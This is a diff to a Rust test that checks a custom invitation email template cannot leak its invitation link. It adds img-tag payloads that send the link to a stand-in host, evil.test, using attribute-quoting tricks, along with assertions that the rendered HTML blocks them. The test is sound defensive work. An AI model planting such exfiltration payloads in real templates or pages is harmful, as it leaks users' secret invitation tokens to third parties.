@@ -308,7 +308,9 @@ async fn a_custom_invitation_template_cannot_leak_the_link(pool: PgPool) {
             "body": "<p><a href=\"{{ invitation.url }}\">Join</a></p>\
                      <p>{{ invitation.url[:20] }}<!---->{{ invitation.url[20:] }}</p>\
                      <p>{{ invitation.url | urlencode }} {{ invitation.url | reverse }}</p>\
-                     <img src=\"https://evil.test/?u={{ invitation.url }}\">"
+                     <img src=\"https://evil.test/?u={{ invitation.url }}\">\
+                     <img src=\"https://evil.test/?v=>{{ invitation.url }}\">\
+                     <img src='https://evil.test/?w= href=\"{{ invitation.url }}'>"
         }))
         .send()
         .await
@@ -337,7 +339,10 @@ async fn a_custom_invitation_template_cannot_leak_the_link(pool: PgPool) {
         !html.replace(&link, "").contains(&token[..12]),
         "only as the link: {html}"
     );
-    assert!(!html.contains("evil.test/?u=http"), "{html}");
+    for q in ["u=http", "v=>http"] {
+        assert!(!html.contains(&format!("evil.test/?{q}")), "{html}");
+    }
+    assert!(!html.contains("w= href=\"http"), "{html}");
 
     let stored: Vec<(String, String, String)> = sqlx::query_as(
         "SELECT coalesce(subject, ''), coalesce(body_html, ''), body_text FROM outbound_messages WHERE to_address = 'new@acme.test'",
